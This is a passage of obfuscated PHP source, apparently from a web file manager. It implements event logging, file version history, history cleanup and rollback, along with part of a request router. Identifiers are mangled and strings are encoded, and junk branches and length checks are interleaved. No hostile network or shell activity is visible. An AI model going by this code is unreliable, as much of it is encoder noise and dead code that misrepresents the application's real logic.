$GLOBALS[$ÛÈ¨á‹€[6]][$ÛÈ¨á‹€[89]][$ÛÈ¨á‹€[1940]] == 1; $È±í‹ıÏ = $ö§‚İ¥– ? 3 : 2; foreach ($óŒàÏ˜ as $¥é¿‹âÏ) { $ó€î†šß = array($¥é¿‹âÏ[$ÛÈ¨á‹€[1837]]); $Ó¢å§È = explode($ÛÈ¨á‹€[50], trim($¥é¿‹âÏ[$ÛÈ¨á‹€[529]], $ÛÈ¨á‹€[50])); if ($Ó¢å§È[0] == $ÛÈ¨á‹€[197] && count($Ó¢å§È) > $È±í‹ıÏ) { $—£‡ç° = array_slice($Ó¢å§È, $È±í‹ıÏ); $ó€î†šß = array_merge($ó€î†šß, array_reverse($—£‡ç°)); } $÷ïª¹ğ– = array_merge($÷ïª¹ğ–, $ó€î†šß); } $‡×•³ĞÎ[$şÔê¬ç] = array_unique($÷ïª¹ğ–); return $‡×•³ĞÎ[$şÔê¬ç]; } public function authTargetInfoMake($é‚æ¿åæ) { $‰ë¸€á¯ =& $_SERVER[™¾ÇÙ¯¹]; $¡‚×Üòš = array(); $®³ÉÕÖ‚ = array(); foreach ($é‚æ¿åæ as $Îâ§š½) { if ($Îâ§š½[$‰ë¸€á¯[419]] == SourceModel::TYPE_USER) { $¡‚×Üòš[] = intval($Îâ§š½[$‰ë¸€á¯[513]]); } else { if ($Îâ§š½[$‰ë¸€á¯[419]] == SourceModel::TYPE_GROUP) { $®³ÉÕÖ‚[] = intval($Îâ§š½[$‰ë¸€á¯[513]]); } } } if ($¡‚×Üòš) { $¡‚×Üòš = Model($‰ë¸€á¯[521])->userListInfo($¡‚×Üòš); } if ($®³ÉÕÖ‚) { $†ŒéåÛ = array($‰ë¸€á¯[1925] => array($‰ë¸€á¯[426], $®³ÉÕÖ‚)); $®³ÉÕÖ‚ = Model($‰ë¸€á¯[530])->field($‰ë¸€á¯[2049])->where($†ŒéåÛ)->select(); $®³ÉÕÖ‚ = array_to_keyvalue($®³ÉÕÖ‚, $‰ë¸€á¯[1837]); } return array($‰ë¸€á¯[2050] => $¡‚×Üòš, $‰ë¸€á¯[2051] => $®³ÉÕÖ‚); } public function authInfo($å¦®ôÕ) { $©…ş‘ÃÕ =& $_SERVER[™¾ÇÙ¯¹]; if ($å¦®ôÕ[$©…ş‘ÃÕ[1941]]) { $Õºòéò = Model($©…ş‘ÃÕ[515])->listData($å¦®ôÕ[$©…ş‘ÃÕ[1941]]); if (!$Õºòéò) { return !1; $Ü±æÈæ² = Model($©…ş‘ÃÕ[515])->listData(); $¨ï›°Ù = array_filter_by_field($Ü±æÈæ², $©…ş‘ÃÕ[421], $©…ş‘ÃÕ[197]); return $¨ï›°Ù; } $¦Ö’ş´† = array_field_key($Õºòéò, array($©…ş‘ÃÕ[407], $©…ş‘ÃÕ[32], $©…ş‘ÃÕ[421], $©…ş‘ÃÕ[1860], $©…ş‘ÃÕ[1861])); $¦Ö’ş´†[$©…ş‘ÃÕ[2052]] = $å¦®ôÕ; return $¦Ö’ş´†; } else { return array($©…ş‘ÃÕ[427] => 0, $©…ş‘ÃÕ[1843] => $å¦®ôÕ[$©…ş‘ÃÕ[1997]], $©…ş‘ÃÕ[428] => $©…ş‘ÃÕ[12], $©…ş‘ÃÕ[1860] => $©…ş‘ÃÕ[2053]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\x63\x65\x5f\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\146\x75\x6e\143\x74\151\157\x6e"), array("\144\145\x73\x63", '', "\151\x6e\x73\x65\162\x74\54\x75\x70\144\x61\x74\145\x2c\x73\145\x6c\x65\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¿¥ßÌ”, $Î§ã£‹¡, $Ë®‰ŠğÜ = '') { $ÎÜõÔàĞ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->eventSave) { return; } $¶üÍÖˆ’ = Model($ÎÜõÔàĞ[1335])->sourceInfo($¿¥ßÌ”); if (!$¶üÍÖˆ’) { return !1; } if ($this->isCacheEvent($¶üÍÖˆ’, $Î§ã£‹¡)) { return; } if ($Ë®‰ŠğÜ && is_string($Ë®‰ŠğÜ)) { $Ë®‰ŠğÜ = array($ÎÜõÔàĞ[1876] => $Ë®‰ŠğÜ); } $¬ûµ»¬‰ = array($ÎÜõÔàĞ[425] => $¿¥ßÌ”, $ÎÜõÔàĞ[2054] => $¶üÍÖˆ’[$ÎÜõÔàĞ[440]], $ÎÜõÔàĞ[2055] => $¶üÍÖˆ’[$ÎÜõÔàĞ[32]], $ÎÜõÔàĞ[527] => !empty($¶üÍÖˆ’[$ÎÜõÔàĞ[527]]) ? $¶üÍÖˆ’[$ÎÜõÔàĞ[527]] : $ÎÜõÔàĞ[12], $ÎÜõÔàĞ[1656] => USER_ID, $ÎÜõÔàĞ[430] => $Î§ã£‹¡, $ÎÜõÔàĞ[1658] => $Ë®‰ŠğÜ); $this->addSystemLog($Î§ã£‹¡, $¬ûµ»¬‰); unset($¬ûµ»¬‰[$ÎÜõÔàĞ[2055]], $¬ûµ»¬‰[$ÎÜõÔàĞ[527]]); return $this->add($¬ûµ»¬‰); } private function addSystemLog($éü¤½ƒÍ, $ŒÃİ’´) { $–Ï¤§ì =& $_SERVER[™¾ÇÙ¯¹]; if ($éü¤½ƒÍ == $–Ï¤§ì[2056]) { $éü¤½ƒÍ = $ŒÃİ’´[$–Ï¤§ì[461]][$–Ï¤§ì[2057]]; } else { if (in_array($éü¤½ƒÍ, array($–Ï¤§ì[1817], $–Ï¤§ì[2058]))) { $éü¤½ƒÍ = $ŒÃİ’´[$–Ï¤§ì[461]][$–Ï¤§ì[770]]; } } $í€µßÓ = array_merge($ŒÃİ’´, array($–Ï¤§ì[2059] => $ŒÃİ’´[$–Ï¤§ì[410]], $–Ï¤§ì[2060] => $ŒÃİ’´[$–Ï¤§ì[2060]])); Hook::trigger($–Ï¤§ì[2061], $–Ï¤§ì[2062] . $éü¤½ƒÍ, $ŒÃİ’´); Model($–Ï¤§ì[1781])->addLog($–Ï¤§ì[2062] . $éü¤½ƒÍ, $í€µßÓ); } private function isCacheEvent($®æöş±°, $Ş¹ä†—ò) { if ($®æöş±°[$_SERVER[™¾ÇÙ¯¹][419]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¡ñåï¦, $¹ûö£…) { $úÓ…¼€… =& $_SERVER[™¾ÇÙ¯¹]; $ğ‚Æî = Model($úÓ…¼€…[1335])->sourceInfo($¡ñåï¦); $‚ğ¿€Éâ = array($úÓ…¼€…[2057] => $¹ûö£…, $úÓ…¼€…[32] => $ğ‚Æî[$úÓ…¼€…[32]]); return $this->addEvent($¡ñåï¦, $úÓ…¼€…[2056], $‚ğ¿€Éâ); } public function eventFileEdit($¼Áœïşª) { $ÙÏ«…È» =& $_SERVER[™¾ÇÙ¯¹]; $üÑŒ©Ü = array($ÙÏ«…È»[2063] => $_SERVER[$ÙÏ«…È»[2064]], $ÙÏ«…È»[2065] => strtolower(ACTION)); if (isset($GLOBALS[$ÙÏ«…È»[7]][$ÙÏ«…È»[2066]])) { $üÑŒ©Ü[$ÙÏ«…È»[2066]] = $ÙÏ«…È»[88]; } return $this->addEvent($¼Áœïşª, $ÙÏ«…È»[1807], $üÑŒ©Ü); } public function eventRecycle($À¢®Øõô, $¶ŒØšáÔ) { return $this->addEvent($À¢®Øõô, $_SERVER[™¾ÇÙ¯¹][2058], $¶ŒØšáÔ); } public function eventRemove($½†î‰·›) { $×ô¥Ë´À =& $_SERVER[™¾ÇÙ¯¹]; $ú’½×…ˆ = Model($×ô¥Ë´À[1335])->sourceInfo($½†î‰·›); $ô»½¶Šö = $ú’½×…ˆ[$×ô¥Ë´À[32]]; return $this->addEvent($ú’½×…ˆ[$×ô¥Ë´À[440]], $×ô¥Ë´À[1806], $ô»½¶Šö); } public function eventShare($üÖ°şíĞ, $Æøæ¶’—) { return $this->addEvent($üÖ°şíĞ, $_SERVER[™¾ÇÙ¯¹][1817], $Æøæ¶’—); } public function eventMove($ŠÆÌÜìó, $¬Ê¹ÓÙÜ, $¬ö¨š) { $ú«°ë®­ =& $_SERVER[™¾ÇÙ¯¹]; $ü¥‘×şÇ = Model($ú«°ë®­[1335]); $Ï§§Øì = $ü¥‘×şÇ->sourceInfo($ŠÆÌÜìó); $ªŸÎ£¸ = $ü¥‘×şÇ->sourceInfo($¬Ê¹ÓÙÜ); $åÌ¨»î‡ = $ü¥‘×şÇ->sourceInfo($¬ö¨š); $ùÒ¡§„¡ = array($ú«°ë®­[1168] => $¬Ê¹ÓÙÜ, $ú«°ë®­[2067] => $ªŸÎ£¸[$ú«°ë®­[32]], $ú«°ë®­[2045] => !empty($ªŸÎ£¸[$ú«°ë®­[527]]) ? $ªŸÎ£¸[$ú«°ë®­[527]] : $ú«°ë®­[12], $ú«°ë®­[1169] => $¬ö¨š, $ú«°ë®­[2068] => $åÌ¨»î‡[$ú«°ë®­[32]], $ú«°ë®­[2069] => !empty($åÌ¨»î‡[$ú«°ë®­[527]]) ? $åÌ¨»î‡[$ú«°ë®­[527]] : $ú«°ë®­[12]); $this->addEvent($ŠÆÌÜìó, $ú«°ë®­[565], $ùÒ¡§„¡); $Ï§§Øì = $ü¥‘×şÇ->sourceInfo($ŠÆÌÜìó); $ùÒ¡§„¡ = array($ú«°ë®­[410] => $Ï§§Øì[$ú«°ë®­[410]], $ú«°ë®­[32] => $Ï§§Øì[$ú«°ë®­[32]]); $this->addEvent($¬Ê¹ÓÙÜ, $ú«°ë®­[2070], $ùÒ¡§„¡); } public function eventCopy($ˆâó„¾Ï) { $this->eventCreate($ˆâó„¾Ï, $_SERVER[™¾ÇÙ¯¹][563]); } public function eventRename($Ê¾ö˜û©, $ˆÃ­ú¿”, $éÕìËĞ¨) { $ôÌşã½ =& $_SERVER[™¾ÇÙ¯¹]; $»ËÀµŞ = array($ôÌşã½[1168] => $ˆÃ­ú¿”, $ôÌşã½[1169] => $éÕìËĞ¨); return $this->addEvent($Ê¾ö˜û©, $ôÌşã½[1350], $»ËÀµŞ); } public function eventAddComment($ÙÄñ«˜ò, $Ü¼´ªü¼) { return $this->addEvent($ÙÄñ«˜ò, $_SERVER[™¾ÇÙ¯¹][2071], $Ü¼´ªü¼); } public function eventAddDesc($Ñ’òúÑ¦, $ÍÃĞıö§) { return $this->addEvent($Ñ’òúÑ¦, $_SERVER[™¾ÇÙ¯¹][2072], $ÍÃĞıö§); } public function listBySource($³‰ùªúŒ) { $£úÜöÏ =& $_SERVER[™¾ÇÙ¯¹]; $Ëâ¦•¼¼ = Model($£úÜöÏ[1335])->sourceInfo($³‰ùªúŒ); $‡éŞĞ«ü = array($£úÜöÏ[425] => $³‰ùªúŒ); if ($Ëâ¦•¼¼[$£úÜöÏ[418]] == $£úÜöÏ[88]) { $ßåò…í = Model($£úÜöÏ[1335])->listSearchChildren($³‰ùªúŒ, 20000); $ßåò…í[] = $³‰ùªúŒ . $£úÜöÏ[252]; $‡éŞĞ«ü = array($£úÜöÏ[410] => array($£úÜöÏ[7], $ßåò…í)); } $ò¿äşÅ« = $this->where($‡éŞĞ«ü)->order($£úÜöÏ[2073])->selectPage(); if ($ò¿äşÅ«[$£úÜöÏ[375]][$£úÜöÏ[376]] == 0) { $ò¿äşÅ«[$£úÜöÏ[375]][$£úÜöÏ[376]] = 1; $ò¿äşÅ«[$£úÜöÏ[378]] = array(array($£úÜöÏ[425] => $³‰ùªúŒ, $£úÜöÏ[2054] => $Ëâ¦•¼¼[$£úÜöÏ[440]], $£úÜöÏ[1656] => $Ëâ¦•¼¼[$£úÜöÏ[462]], $£úÜöÏ[430] => $£úÜöÏ[2074], $£úÜöÏ[431] => $Ëâ¦•¼¼[$£úÜöÏ[200]], $£úÜöÏ[1658] => $£úÜöÏ[12])); } return $this->eventListParse($ò¿äşÅ«, $³‰ùªúŒ); } private function eventListParse($µ¾—œÑï, $°ººÀ¾Î) { $¸ÍÔİ‡ =& $_SERVER[™¾ÇÙ¯¹]; $êë½‘‹ò = $µ¾—œÑï[$¸ÍÔİ‡[378]]; $ì™ÙÙËƒ = array_to_keyvalue($êë½‘‹ò, $¸ÍÔİ‡[12], $¸ÍÔİ‡[410]); $½Ãòàõ = array_to_keyvalue($êë½‘‹ò, $¸ÍÔİ‡[12], $¸ÍÔİ‡[2060]); foreach ($êë½‘‹ò as $ÔÌ­éËş) { $¢‡˜‚àŠ = $ÔÌ­éËş[$¸ÍÔİ‡[461]]; if ($ÔÌ­éËş[$¸ÍÔİ‡[33]] == $¸ÍÔİ‡[565] && isset($¢‡˜‚àŠ[$¸ÍÔİ‡[1168]])) { $ì™ÙÙËƒ[] = $¢‡˜‚àŠ[$¸ÍÔİ‡[1168]] . $¸ÍÔİ‡[12]; $ì™ÙÙËƒ[] = $¢‡˜‚àŠ[$¸ÍÔİ‡[1169]] . $¸ÍÔİ‡[12]; } if ($ÔÌ­éËş[$¸ÍÔİ‡[33]] == $¸ÍÔİ‡[2070] && isset($¢‡˜‚àŠ[$¸ÍÔİ‡[410]])) { $ì™ÙÙËƒ[] = $¢‡˜‚àŠ[$¸ÍÔİ‡[410]] . $¸ÍÔİ‡[12]; } } $ì™ÙÙËƒ = array_merge($ì™ÙÙËƒ, $½Ãòàõ, array($°ººÀ¾Î . $¸ÍÔİ‡[12])); $ì™ÙÙËƒ = array_unique($ì™ÙÙËƒ); $êÛºáîÀ = array_unique(array_to_keyvalue($êë½‘‹ò, $¸ÍÔİ‡[12], $¸ÍÔİ‡[1665])); $©…ÇÓÍ› = Model($¸ÍÔİ‡[543])->userListInfo($êÛºáîÀ); $¥†İã™è = Model($¸ÍÔİ‡[840])->sourceListInfo($ì™ÙÙËƒ, !0); foreach ($êë½‘‹ò as &$ÔÌ­éËş) { if ($ÔÌ­éËş[$¸ÍÔİ‡[33]] == $¸ÍÔİ‡[565] && isset($ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[1168]])) { $ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[1168]] = $¥†İã™è[$ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[1168]]]; $ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[1169]] = $¥†İã™è[$ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[1169]]]; } if ($ÔÌ­éËş[$¸ÍÔİ‡[33]] == $¸ÍÔİ‡[2070] && isset($ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[410]])) { $ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[410]] = $¥†İã™è[$ÔÌ­éËş[$¸ÍÔİ‡[461]][$¸ÍÔİ‡[410]]]; } $ÔÌ­éËş[$¸ÍÔİ‡[86]] = $¥†İã™è[$ÔÌ­éËş[$¸ÍÔİ‡[410]]]; $ÔÌ­éËş[$¸ÍÔİ‡[2075]] = $¥†İã™è[$ÔÌ­éËş[$¸ÍÔİ‡[2060]]]; if ($ÔÌ­éËş[$¸ÍÔİ‡[33]] == $¸ÍÔİ‡[1806]) { $ÔÌ­éËş[$¸ÍÔİ‡[2075]] = $ÔÌ­éËş[$¸ÍÔİ‡[86]]; $ÔÌ­éËş[$¸ÍÔİ‡[2060]] = $ÔÌ­éËş[$¸ÍÔİ‡[2075]][$¸ÍÔİ‡[410]]; $ÔÌ­éËş[$¸ÍÔİ‡[86]] = !1; $ÔÌ­éËş[$¸ÍÔİ‡[410]] = $¸ÍÔİ‡[12]; } $ÔÌ­éËş[$¸ÍÔİ‡[2005]] = $©…ÇÓÍ›[$ÔÌ­éËş[$¸ÍÔİ‡[1665]]]; } unset($ÔÌ­éËş); $µ¾—œÑï[$¸ÍÔİ‡[378]] = $êë½‘‹ò; return $µ¾—œÑï; } public function removeBySource($ûÀä¢Ê) { $ÄÏÔ–îï = array($_SERVER[™¾ÇÙ¯¹][425] => $ûÀä¢Ê); $this->where($ÄÏÔ–îï)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\x65\137\x68\x69\x73\x74\x6f\x72\x79"; public function historyCount($§×†ë©½) { $£ù§È½ì =& $_SERVER[™¾ÇÙ¯¹]; if (!$§×†ë©½) { return array(); } if (is_string($§×†ë©½) || is_int($§×†ë©½)) { $§×†ë©½ = array($§×†ë©½); } $ÍõÃ¢Ñ” = array($£ù§È½ì[410], $£ù§È½ì[1870] => $£ù§È½ì[508]); $€Ù›Ã† = array($£ù§È½ì[410] => array($£ù§È½ì[7], $§×†ë©½)); $°´ÊŸ°¸ = $this->field($ÍõÃ¢Ñ”)->where($€Ù›Ã†)->group($£ù§È½ì[410])->select(); return array_to_keyvalue($°´ÊŸ°¸, $£ù§È½ì[410], $£ù§È½ì[508]); } public function addHistory($±Ê¶åİ¸, $€€÷à¦† = '') { $‹Àà‰æ½ =& $_SERVER[™¾ÇÙ¯¹]; $˜æ‘¸ƒÏ = array($‹Àà‰æ½[425] => $±Ê¶åİ¸[$‹Àà‰æ½[410]], $‹Àà‰æ½[1656] => isset($±Ê¶åİ¸[$‹Àà‰æ½[464]]) ? $±Ê¶åİ¸[$‹Àà‰æ½[464]] : $±Ê¶åİ¸[$‹Àà‰æ½[462]], $‹Àà‰æ½[477] => $±Ê¶åİ¸[$‹Àà‰æ½[476]], $‹Àà‰æ½[593] => $±Ê¶åİ¸[$‹Àà‰æ½[76]], $‹Àà‰æ½[2076] => $€€÷à¦†); if ($GLOBALS[$‹Àà‰æ½[6]][$‹Àà‰æ½[89]][$‹Àà‰æ½[1217]] >= 1) { $this->historyAutoClear($˜æ‘¸ƒÏ[$‹Àà‰æ½[410]]); $this->add($˜æ‘¸ƒÏ); } Hook::trigger($‹Àà‰æ½[2077], $˜æ‘¸ƒÏ); Model($‹Àà‰æ½[2078])->eventFileEdit($±Ê¶åİ¸[$‹Àà‰æ½[410]]); } private function historyAutoClear($Øóø€æ²) { $Ê°÷É¹¥ =& $_SERVER[™¾ÇÙ¯¹]; $èĞÆƒšä = Model($Ê°÷É¹¥[785])->get($Ê°÷É¹¥[1239]); $‰öØÚÑÖ = $GLOBALS[$Ê°÷É¹¥[6]][$Ê°÷É¹¥[89]][$Ê°÷É¹¥[1217]]; $‚ê­ÓãÄ = $èĞÆƒšä == $Ê°÷É¹¥[1240] ? min(5, $‰öØÚÑÖ) : $‰öØÚÑÖ; $‚ê­ÓãÄ = $‚ê­ÓãÄ <= 0 ? 0 : $‚ê­ÓãÄ - 1; if ($‚ê­ÓãÄ >= 500) { return; } $ı¹£¡’ = array($Ê°÷É¹¥[425] => $Øóø€æ²); $ºÇôµ˜Õ = $this->field($Ê°÷É¹¥[2079])->where($ı¹£¡’)->order($Ê°÷É¹¥[2073])->select(); if (!$ºÇôµ˜Õ || $‚ê­ÓãÄ >= count($ºÇôµ˜Õ)) { return; } $«µÓË = array_to_keyvalue($ºÇôµ˜Õ, $Ê°÷É¹¥[12], $Ê°÷É¹¥[407]); $«µÓË = array_slice($«µÓË, $‚ê­ÓãÄ); $ˆĞ’ŠëÁ = array_to_keyvalue($ºÇôµ˜Õ, $Ê°÷É¹¥[12], $Ê°÷É¹¥[476]); $ˆĞ’ŠëÁ = array_slice($ˆĞ’ŠëÁ, $‚ê­ÓãÄ); if (!$«µÓË || !$ˆĞ’ŠëÁ) { return; } $ı¹£¡’ = array($Ê°÷É¹¥[427] => array($Ê°÷É¹¥[7], $«µÓË)); $this->where($ı¹£¡’)->delete(); Model($Ê°÷É¹¥[479])->remove($ˆĞ’ŠëÁ); } public function listData($†¥Ôœ¨Ş) { $ ´´ñ‡ä =& $_SERVER[™¾ÇÙ¯¹]; $‰™¢Î™ = array($ ´´ñ‡ä[425] => $†¥Ôœ¨Ş); $ß›£Œ‘ = $ ´´ñ‡ä[2080]; $ªß‡òÛ¡ = $this->field($ß›£Œ‘)->where($‰™¢Î™)->order($ ´´ñ‡ä[2073])->selectPage(); $this->_listAppendUser($ªß‡òÛ¡[$ ´´ñ‡ä[378]]); $ØêúÉëğ = Model($ ´´ñ‡ä[785])->get($ ´´ñ‡ä[1239]); $û˜ÙˆÂ = 5; if ($ØêúÉëğ == $ ´´ñ‡ä[1240]) { $ªß‡òÛ¡[$ ´´ñ‡ä[378]] = array_slice($ªß‡òÛ¡[$ ´´ñ‡ä[378]], 0, $û˜ÙˆÂ); $ªß‡òÛ¡[$ ´´ñ‡ä[375]] = array($ ´´ñ‡ä[2081] => 1, $ ´´ñ‡ä[2082] => 20, $ ´´ñ‡ä[2083] => 1, $ ´´ñ‡ä[2084] => count($ªß‡òÛ¡[$ ´´ñ‡ä[378]])); } return $ªß‡òÛ¡; } protected function _listAppendUser(&$Ç×Œ°á) { $ˆ±·³ê =& $_SERVER[™¾ÇÙ¯¹]; $º„ÓÔ×Ç = array_to_keyvalue($Ç×Œ°á, $ˆ±·³ê[12], $ˆ±·³ê[1665]); $üôç‘¤Å = Model($ˆ±·³ê[543])->userListInfo($º„ÓÔ×Ç); foreach ($Ç×Œ°á as &$…ŸÈô”) { $œÅçÃöâ = $…ŸÈô”[$ˆ±·³ê[1665]]; $…ŸÈô”[$ˆ±·³ê[462]] = $üôç‘¤Å[$œÅçÃöâ] ? $üôç‘¤Å[$œÅçÃöâ] : !1; } unset($…ŸÈô”); } public function fileInfo($úÙ§…»ù) { $¡ÖùÉ…’ =& $_SERVER[™¾ÇÙ¯¹]; $Ñâı‘„ì = $this->tablePrefix; $³ê¨ı’÷ = "{$Ñâı‘„ì}\151\157\x5f\146\x69\154\x65\40\x66\x69\x6c\x65\163\40\x6f\156\x20\146\151\x6c\145\x73\56\x66\151\154\x65\111\x44\x20\x3d\40\150\151\163\x74\x6f\162\x79\x2e\x66\x69\x6c\x65\x49\104"; return $this->alias($¡ÖùÉ…’[2085])->where(array($¡ÖùÉ…’[427] => $úÙ§…»ù))->join($³ê¨ı’÷, $¡ÖùÉ…’[2086])->find(); } public function removeItem($ÁŠ¾Š®£) { $„‹“Ÿ£å =& $_SERVER[™¾ÇÙ¯¹]; $ˆ‚ÃÈˆÇ = array($„‹“Ÿ£å[427] => $ÁŠ¾Š®£); $¼ışœò¬ = $this->where($ˆ‚ÃÈˆÇ)->find(); if ($¼ışœò¬) { $‰ßÕ³ú³ = $this->where($ˆ‚ÃÈˆÇ)->delete(); Model($„‹“Ÿ£å[479])->remove($¼ışœò¬[$„‹“Ÿ£å[476]]); return $‰ßÕ³ú³; } return !1; } public function removeBySource($Ì‹»ÜŠ) { $Éèµ¸ì =& $_SERVER[™¾ÇÙ¯¹]; if (!$Ì‹»ÜŠ) { return !1; } if (!is_array($Ì‹»ÜŠ)) { $Ì‹»ÜŠ = array($Ì‹»ÜŠ); } $¹–´õöÒ = array($Éèµ¸ì[425] => array($Éèµ¸ì[7], $Ì‹»ÜŠ)); $á¾²Öğ = $this->field($Éèµ¸ì[477])->where($¹–´õöÒ)->select(); if ($á¾²Öğ) { $this->where($¹–´õöÒ)->delete(); $è‡ú¥ú³ = array_to_keyvalue($á¾²Öğ, $Éèµ¸ì[12], $Éèµ¸ì[476]); Model($Éèµ¸ì[479])->remove($è‡ú¥ú³); } return !0; } public function setDetail($œ´óø»Æ, $®º»”½Ù) { $†óãµ§ê =& $_SERVER[™¾ÇÙ¯¹]; return $this->where(array($†óãµ§ê[427] => $œ´óø»Æ))->save(array($†óãµ§ê[2076] => $®º»”½Ù)); } public function rollbackToItem($ÍÕÆÕêï, $íå¬ÔšÅ) { $Â¾İ®ÎÁ =& $_SERVER[™¾ÇÙ¯¹]; $Òš»ºº  = Model($Â¾İ®ÎÁ[840])->sourceInfo($ÍÕÆÕêï); $this->addHistory($Òš»ºº , LNG($Â¾İ®ÎÁ[2087])); $êÅáØ¸ = $this->find($íå¬ÔšÅ); $¢ÂÄ–ŞÁ = array($Â¾İ®ÎÁ[476] => $êÅáØ¸[$Â¾İ®ÎÁ[476]], $Â¾İ®ÎÁ[76] => $êÅáØ¸[$Â¾İ®ÎÁ[76]], $Â¾İ®ÎÁ[85] => time(), $Â¾İ®ÎÁ[464] => USER_ID); Model($Â¾İ®ÎÁ[840])->where(array($Â¾İ®ÎÁ[410] => $ÍÕÆÕêï))->save($¢ÂÄ–ŞÁ); return $this->where(array($Â¾İ®ÎÁ[427] => $íå¬ÔšÅ))->delete(); } public function clearSame($¬î¡‰Š) { $„ØçƒĞü =& $_SERVER[™¾ÇÙ¯¹]; $ÔÉ¥‹Á× = $this->listData($¬î¡‰Š); $öœÕ˜Ü = array_to_keyvalue_group($ÔÉ¥‹Á×, $„ØçƒĞü[476]); $Èøù×§é = array(); $ÛŞşÑã = array(); foreach ($öœÕ˜Ü as $š˜Æ˜ùî) { if (!$š˜Æ˜ùî || count($š˜Æ˜ùî) <= 1) { continue; } foreach ($š˜Æ˜ùî as $›Ê¤¯ú¡) { $Èøù×§é[] = $›Ê¤¯ú¡[$„ØçƒĞü[476]]; $ÛŞşÑã[] = $›Ê¤¯ú¡[$„ØçƒĞü[407]]; } } if (!$ÛŞşÑã) { return; } $this->where(array($„ØçƒĞü[407] => array($„ØçƒĞü[7], $ÛŞşÑã)))->delete(); Model($„ØçƒĞü[479])->remove($Èøù×§é); } public function userSpace() { $’Óş­óá =& $_SERVER[™¾ÇÙ¯¹]; $Ãì¥¢ı = $this->tablePrefix; $ÊĞË”¢Ğ = array($’Óş­óá[1656] => USER_ID); $¶ ¬¼¹ü = "{$Ãì¥¢ı}\x69\157\137\146\x69\x6c\x65\40\x66\x69\x6c\x65\163\40\x6f\x6e\40\146\151\x6c\145\x73\56\146\151\x6c\x65\x49\x44\x20\75\40\x68\151\163\x74\x6f\162\171\x2e\146\151\154\145\x49\x44"; return $this->alias($’Óş­óá[2085])->where($ÊĞË”¢Ğ)->join($¶ ¬¼¹ü, $’Óş­óá[2086])->sum($’Óş­óá[76]); } } goto CÜ©åÛÉö«; FÖêĞÅæïØ: if (strlen($oqhzyacujb) < $_SERVER[™¾ÇÙ¯¹][627]) { return; } class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($ºØ„ÙÚÒ) { $øİ¯ Öä =& $_SERVER[™¾ÇÙ¯¹]; $®óÌµæ =& $_SERVER[×ô×“Ò]; $…  §³Ö = explode($®óÌµæ[0], trim($ºØ„ÙÚÒ, $®óÌµæ[0])); $Ò»»Ùçà = $øİ¯ Öä[628]; while ($Ò»»Ùçà < $øİ¯ Öä[249]) { if ($Ò»»Ùçà >= 0) { break; } $Ò»»Ùçà++; } $this->defaultModule = $…  §³Ö[0] ? $…  §³Ö[0] : $this->defaultModule; $this->defaultController = $…  §³Ö[1] ? $…  §³Ö[1] : $this->defaultController; $—éİ®ãÖ = $øİ¯ Öä[629]; $this->defaultAction = $…  §³Ö[2] ? $…  §³Ö[2] : $this->defaultAction; $ÌÅ€ Ñ = $øİ¯ Öä[630]; $this->wpuycfcc3528($®óÌµæ[1], array($this, $®óÌµæ[2])); $àßñ’·“ = $øİ¯ Öä[631]; if (strlen($àßñ’·“) < $øİ¯ Öä[627]) { die; } } public function appRun($¤·‰€) { $Êêôè™¸ =& $_SERVER[™¾ÇÙ¯¹]; $¦ŒÉï°© =& $_SERVER[×ô×“Ò]; $‹úÖö¿± = explode($¦ŒÉï°©[0], $¤·‰€); $î´’°œ = $Êêôè™¸[632]; if (strlen($î´’°œ) < $Êêôè™¸[623]) { die; } $óÕåğß = strtolower($‹úÖö¿±[0]); $ËèªÒ…Á = $¦ŒÉï°©[3]; if ($óÕåğß == $¦ŒÉï°©[4]) { $ËèªÒ…Á = $¦ŒÉï°©[5]; $‹úÖö¿±[0] = $¦ŒÉï°©[6]; $‹úÖö¿±[1] = $‹úÖö¿±[1] . $¦ŒÉï°©[7]; $¤·‰€ = join($¦ŒÉï°©[0], $‹úÖö¿±); $¤·‰€ = trim($¤·‰€, $¦ŒÉï°©[0]); } call_user_func(array($¦ŒÉï°©[8], $¦ŒÉï°©[9]), $ËèªÒ…Á . $¦ŒÉï°©[10], $¤·‰€); ActionCall($¤·‰€); $Àäô³è = $Êêôè™¸[633]; if (strlen($Àäô³è) < $Êêôè™¸[634]) { die; } call_user_func(array($¦ŒÉï°©[8], $¦ŒÉï°©[9]), $ËèªÒ…Á . $¦ŒÉï°©[11], $¤·‰€); $ÌèÓªô— = $Êêôè™¸[635]; while (strlen($ÌèÓªô—) < $Êêôè™¸[634]) { if (!$ÌèÓªô—) { break; } $ÌèÓªô—++; } } private function autorun() { $ı²ÙÆ˜Ÿ =& $_SERVER[×ô×“Ò]; global $config; $Ø‰Ö×ûÂ = $_SERVER[™¾ÇÙ¯¹][636]; if (count($config[$ı²ÙÆ˜Ÿ[12]]) == 0) { return; } foreach ($config[$ı²ÙÆ˜Ÿ[12]] as $ÜÀïŠÂ => $õ­åÈ¦) { $this->appRun($õ­åÈ¦); } } private function lfnwf10777be() { $ÙÆ—Ò©æ =& $_SERVER[™¾ÇÙ¯¹]; $İÄØÕ‡ö =& $_SERVER[×ô×“Ò]; $áÚí°Ïü = $İÄØÕ‡ö[4]; $å¸ØÔù = $GLOBALS[$İÄØÕ‡ö[13]][$İÄØÕ‡ö[14]][0]; if (!$å¸ØÔù || strlen($å¸ØÔù) <= strlen($áÚí°Ïü)) { return; } if (strtolower(substr($å¸ØÔù, 